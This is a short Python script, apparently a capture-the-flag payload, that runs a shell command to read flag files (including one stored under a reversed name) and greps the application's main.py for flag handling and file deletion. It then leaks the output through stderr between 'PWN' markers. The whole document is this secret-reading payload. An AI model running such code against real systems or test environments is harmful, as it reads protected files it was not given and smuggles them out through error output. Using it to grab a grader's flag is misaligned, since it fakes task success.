import sys, subprocess
cmd = 'echo [GALF]; cat /.txt.galf 2>/dev/null; echo; echo [PLAIN]; cat /flag.txt 2>/dev/null; echo; echo [MAIN]; sed -n "1,60p" /app/src/phonenumber/main.py 2>/dev/null | grep -nE "FLAG|galf|flag|unlink|remove|rename"'
r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
sys.stderr.write("\n=====PWN_START=====\n" + r.stdout + r.stderr + "\n=====PWN_END=====\n")
sys.stderr.flush()
raise SystemExit("done")
